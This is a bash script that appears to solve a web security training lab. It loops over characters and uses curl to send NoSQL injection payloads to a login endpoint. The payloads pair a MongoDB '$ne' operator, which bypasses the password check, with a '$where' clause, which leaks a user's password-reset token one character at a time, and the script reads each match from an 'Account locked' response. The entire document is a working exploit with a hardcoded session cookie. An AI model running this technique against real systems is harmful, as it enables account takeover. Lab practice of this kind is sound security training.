#!/bin/bash

pos=$1
for char in {a..z} {A..Z} {0..9}; do
  result=$(curl -s -X POST "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login" \
    -H "Cookie: session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"carlos\",\"password\":{\"\$ne\":\"invalid\"},\"\$where\":\"this.resetPwdToken && this.resetPwdToken[$pos] == '$char'\"}" \
    --compressed)

  if echo "$result" | grep -q "Account locked"; then
    echo "$char"
    break
  fi
done